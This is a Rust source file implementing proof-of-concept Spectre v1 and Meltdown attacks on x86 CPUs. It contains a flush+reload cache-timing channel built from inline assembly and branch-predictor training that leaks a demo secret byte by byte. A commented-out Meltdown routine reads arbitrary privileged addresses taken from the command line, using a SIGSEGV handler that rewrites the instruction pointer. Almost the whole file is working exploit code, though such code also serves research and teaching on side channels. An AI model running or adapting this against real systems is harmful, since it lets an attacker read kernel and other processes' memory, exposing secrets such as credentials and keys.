#![feature(asm)]

use std::num::Wrapping;

use rand::seq::SliceRandom;
use rand::thread_rng;

use nix::sys::signal::{sigaction, SaFlags, SigAction, SigHandler, SigSet, Signal};
use std::convert::TryFrom;

const MULTIPLE_OFFSET: usize = 8192;
const CACHE_LINE_SIZE: usize = 4096;
const NB_CYCLES_TRAIN: u64 = 1000;
const NB_TIMES: usize = 1000;
const ZERO_TRESHOLD: usize = 997;

static mut TEST_ARR: [u8; 256 * MULTIPLE_OFFSET + CACHE_LINE_SIZE + 2 * 4096] =
    [0; 256 * MULTIPLE_OFFSET + CACHE_LINE_SIZE + 2 * 4096];
static mut LATENCIES: [u64; 256] = [0; 256];

static mut BASE_ADDR: usize = 0;
static mut NB_CYCLES: u64 = 0;
static mut SPECTRE_LIMIT: u64 = 15;
static mut SECRET: &[u8] = "000000000000000ILIKEDEADBEEF".as_bytes();
static mut OTHER_SECRET: u64 = 0xfedcba9876543210;

extern "C" fn handle_sigsegv(
    signal: libc::c_int,
    info: *mut libc::siginfo_t,
    arg: *mut libc::c_void,
) {
    let mut context = unsafe { (arg as *mut libc::ucontext_t).as_mut().unwrap() };
    // very verbose, only uncomment if you want to see that you're leaking data from privileged
    // addresses that you cannot access
    let offending_address =
        unsafe { (*info)._pad[1] as usize | (((*info)._pad[2] as usize) << 32) };
    println!(
        "Got {:?} with offending_addres 0x{:x}, ignoring",
        Signal::try_from(signal).unwrap(),
        offending_address
    );
    // overwrite RIP to jump to our trampoline (REG_RIP = 16)
    // 15 is the width needed to encode the instructions in release mode,
    // let's set it to 25 and be done with it!
    context.uc_mcontext.gregs[16] += 25;
}

#[inline(always)]
fn flush_measurement_area() {
    unsafe {
        for i in 0..((256 * MULTIPLE_OFFSET) / CACHE_LINE_SIZE) {
            core::arch::x86_64::_mm_clflush(
                (BASE_ADDR as usize + i * CACHE_LINE_SIZE) as *const u8 as *mut u8,
            );
        }
    }
}

#[inline(always)]
fn measure_time_to_read(address: usize) -> u64 {
    let delta_tsc;
    unsafe {
        asm!("mfence", "lfence", "rdtsc", "lfence", "shl rdx, $32", "or rax, rdx", "mov rcx, rax",
             "movzx r9, byte ptr [{0}]",
             "mfence", "lfence",  "rdtsc", "shl rdx, $32", "or rax, rdx", "sub rax, rcx",
             in(reg) address,
             out("rdx") _, out("rcx") _, out("rax") delta_tsc, out("r9") _);
    }

    delta_tsc
}

#[inline(always)]
fn measure_byte() -> Option<u8> {
    let mut v: Vec<u8> = (0..=255).collect();
    v.shuffle(&mut thread_rng());

    unsafe {
        for i in 0..256 {
            let count_addr = BASE_ADDR as usize + v[i] as usize * MULTIPLE_OFFSET;
            LATENCIES[v[i] as usize] = measure_time_to_read(count_addr);
        }

        LATENCIES
            .iter()
            .enumerate()
            .min_by(|(_, x), (_, y)| x.cmp(y))
            // the access should take less than NB_CYCLES CPU cycles
            .filter(|(_, &x)| x < NB_CYCLES)
            .map(|(x, _)| x as u8)
    }
}

#[inline(always)]
unsafe fn access_memory(target_adress: usize) {
    asm!(
        "mov rax, {0}", "movzx rax, byte ptr [rax]", "imul rax, {2}", "add rax, {1}", "movzx rax, byte ptr [rax]",
         // nop sled for the signal handler to skip the access upon segfault
         "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop",
         in(reg) target_adress, in(reg) BASE_ADDR, in(reg) MULTIPLE_OFFSET, out("rbx") _, out("rax") _);
}

#[inline(always)]
fn repeat_move_for_training_meltdown() {
    unsafe {
        let train_addr = &TEST_ARR[0] as *const u8 as usize;

        asm!(
            "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]", "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",
            in("rcx") train_addr, out("rax") _);
    }
}

unsafe fn perform_access(
    preload_op: unsafe fn(),
    target_adress: *const u8,
    nb_bytes: usize,
) -> Vec<u8> {
    sigaction(
        Signal::SIGSEGV,
        &SigAction::new(
            SigHandler::SigAction(handle_sigsegv),
            SaFlags::empty(),
            SigSet::empty(),
        ),
    )
    .unwrap();

    let mut res: Vec<u8> = Vec::with_capacity(nb_bytes);

    for i in 0..nb_bytes {
        let mut histogram = [0usize; 256];

        for _ in 0..NB_TIMES {
            // load the data that must be accessed in cache
            preload_op();

            flush_measurement_area();

            repeat_move_for_training_meltdown();

            access_memory(target_adress as usize + i);

            let leaked_byte = measure_byte().unwrap_or(0);
            histogram[leaked_byte as usize] += 1;
        }

        if histogram[0] > ZERO_TRESHOLD {
            //println!("{:?}", histogram);
            res.push(0);
        } else {
            res.push(
                histogram[1..]
                    .iter()
                    .enumerate()
                    .max_by(|(_, x), (_, y)| x.cmp(y))
                    .map(|(x, _)| x as u8 + 1)
                    .unwrap(),
            )
        }
    }

    res
}

#[inline(always)]
unsafe fn spectre_test(i: usize) {
    // we can only read the first 15 bytes, which are all the number 0, so we're safe, right?
    // Right!?
    if i < SPECTRE_LIMIT as usize {
        std::ptr::read_volatile((BASE_ADDR + (SECRET[i] as usize * MULTIPLE_OFFSET)) as *const u8);
    }
}

unsafe fn spectre_attack() {
    let mut string = Vec::new();
    for i in 0..50 {
        let mut res = Vec::with_capacity(25);
        for _ in 0..25 {
            // training phase
            for i in 0..5_000_000 {
                spectre_test(i % 15);
            }

            // attack phase
            flush_measurement_area();
            std::arch::x86_64::_mm_clflush(&SPECTRE_LIMIT as *const u64 as *const u8);

            let val = (Wrapping(&SECRET[0] as *const u8 as usize)
                - Wrapping(SECRET as *const [u8] as *const u8 as usize)
                + Wrapping(i))
            .0;

            spectre_test(val);

            res.push(measure_byte().unwrap_or(0));
        }
        string.push(*res.iter().max().unwrap());
    }

    println!("{}", String::from_utf8_unchecked(string));
}

fn read_ptr(preload_op: unsafe fn(), target_adress: usize) -> usize {
    let vec = unsafe { perform_access(preload_op, target_adress as *const u8, 8) };
    vec.iter()
        .enumerate()
        .fold(0, |acc, (pos, e)| acc | ((*e as usize) << (pos * 8)))
}

fn setup_measurements() {
    unsafe {
        let base_addr = TEST_ARR.as_ptr() as usize;
        // align on a cache line size
        BASE_ADDR =
            (base_addr + 4096 + CACHE_LINE_SIZE) & (0xffffffffffffffff - CACHE_LINE_SIZE + 1);

        // prefetch
        for i in 0..TEST_ARR.len() {
            TEST_ARR[i] = 127;
        }

        std::ptr::read_volatile(BASE_ADDR as *const u8);
        let mut read_cached_time = 0;
        for _ in 0..NB_CYCLES_TRAIN {
            read_cached_time += measure_time_to_read(BASE_ADDR);
        }
        read_cached_time /= NB_CYCLES_TRAIN;

        let mut read_flushed_time = 0;
        for _ in 0..NB_CYCLES_TRAIN {
            std::arch::x86_64::_mm_clflush(BASE_ADDR as *mut u8);
            read_flushed_time += measure_time_to_read(BASE_ADDR);
        }
        read_flushed_time /= NB_CYCLES_TRAIN;

        NB_CYCLES = read_cached_time + (read_flushed_time - read_cached_time) / 2;

        println!(
            "time to read a:\n- cached entry: {}\n- cold entry: {}\nFixing the treshold at {} cycles",
            read_cached_time, read_flushed_time, NB_CYCLES
        );
    };
}

fn main() {
    setup_measurements();

    unsafe {
        spectre_attack();
    }
    // meltdown
    /*
    let args = std::env::args().collect::<Vec<String>>();
    let addr = usize::from_str_radix(&args[1][2..], 16).unwrap();

    unsafe {
        println!("Trying to read 64 bytes at 0x{:x}", addr);
        let bytes = perform_access(
            || {
                std::fs::read_to_string("/proc/version").unwrap();
            },
            addr as *const u8,
            64,
        );
        println!("Bytes read: {:?}", bytes);
        println!(
            "String representation: \"{}\"",
            std::str::from_utf8_unchecked(&bytes)
        );
    }
    */
}
